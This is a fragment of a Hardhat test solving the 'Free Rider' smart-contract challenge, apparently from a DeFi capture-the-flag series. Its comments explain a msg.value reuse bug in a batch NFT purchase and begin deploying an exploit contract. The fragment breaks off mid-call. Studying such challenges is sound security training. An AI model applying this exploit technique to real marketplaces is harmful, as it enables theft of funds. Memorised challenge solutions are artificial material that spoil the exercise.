...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    ...
    // Starting ETH balance of the attacker 0.5 ETH
    // 6 NFTs cost 15 ETH
    // The bug is that _buyOne checks the value of what the attacker send but it does not decrease when you call _buyMany
    const FreeRiderExploitFactory = await ethers.getContractFactory(
      "FreeRiderExploitDeployer",
      attacker
    );
    console.log("Starting exploit");
    await FreeRiderExploitFactory.deploy(
